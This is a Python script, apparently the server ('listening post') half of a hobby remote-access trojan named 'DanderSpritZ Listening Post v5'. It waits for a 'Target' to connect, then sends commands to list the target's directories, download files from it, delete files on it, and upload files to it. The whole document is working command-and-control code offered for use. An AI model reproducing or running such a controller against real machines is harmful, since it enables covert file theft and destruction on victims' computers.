## DanderSpritZ Listening Post v5
## By ShowNadda

# Global Imports
import time
import sys
import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1'
port = 8080
s.bind((host, port))
print("")
print("DanderSpritZ Listening Post is running on",host,":",port)
print("")
print("Waiting for Targets to connect...")
s.listen(1)
conn, addr = s.accept()
print("")
print("Target with the IP of ",addr,"has connected.")
print("")

# Main Command list loop

while 1:
    command = input(str("DanderSpritZ Prompt [*] : "))
    if command == "view_cfd":
        conn.send(command.encode())
        print("")
        print("Command has been sent to Target.")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print ("Command output : ",files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent to Target.")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Directory Search Results : ", files)
        
    elif command == "file_download_remote":
        conn.send(command.encode())
        print("")        
        filepath = input(str("Enter the full Directory Path and full File Name to download here: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("Enter the local file name and extension for the remote file to be saved as: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")        
        print(filename, "has finished downloading.")
        print("")

    elif command == "remove_file":
        conn.send(command.encode())
        dirandfile = input(str("Type the full path of the file, and it's extension : "))
        conn.send(dirandfile.encode())
        print("")
        print("File has been deleted successfully.")
        print("")

    elif command == "send_files":
        conn.send(command.encode())
        file = input (str("Enter the full file path and file extension to send to Client : "))
        filename = input(str("Enter the file name that will appear on the Client : "))
        data = open(file, "rb")
        file_data = data.read(10000) # Increase with a large file size. Both Client and LP need the same number.
        conn.send(filename.encode())
        conn.send(file_data)
        print("")
        print(file, "was sent successfully.")
        print("")

    elif command == "shutdown":
        print("Client has run the shutdown.bat file.")
        print("")

    else:
        print("Command not recognized.") 